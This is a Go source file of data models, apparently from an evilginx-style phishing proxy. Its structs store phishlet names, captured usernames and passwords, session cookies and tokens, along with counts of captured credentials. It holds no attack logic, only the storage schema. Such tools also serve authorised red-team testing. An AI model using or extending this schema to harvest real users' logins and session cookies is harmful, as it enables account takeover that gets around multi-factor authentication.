package models

import (
	"time"
)

type Session struct {
	ID           string                             `json:"id" db:"id"`
	Index        int                                `json:"index" db:"index"`
	PhishletName string                             `json:"phishlet_name" db:"phishlet_name"`
	LandingURL   string                             `json:"landing_url" db:"landing_url"`
	Username     string                             `json:"username" db:"username"`
	Password     string                             `json:"password" db:"password"`
	Custom       map[string]string                  `json:"custom" db:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens" db:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens" db:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"cookie_tokens" db:"cookie_tokens"`
	UserAgent    string                             `json:"user_agent" db:"user_agent"`
	RemoteAddr   string                             `json:"remote_addr" db:"remote_addr"`
	CreateTime   time.Time                          `json:"create_time" db:"create_time"`
	UpdateTime   time.Time                          `json:"update_time" db:"update_time"`
	IsActive     bool                               `json:"is_active" db:"is_active"`
	RedirectURL  string                             `json:"redirect_url,omitempty" db:"redirect_url"`
}

type CookieToken struct {
	Name     string `json:"name" db:"name"`
	Value    string `json:"value" db:"value"`
	Path     string `json:"path" db:"path"`
	HttpOnly bool   `json:"http_only" db:"http_only"`
}

type SessionStats struct {
	TotalSessions   int `json:"total_sessions"`
	ActiveSessions  int `json:"active_sessions"`
	CapturedCreds   int `json:"captured_creds"`
	UniquePhishlets int `json:"unique_phishlets"`
}
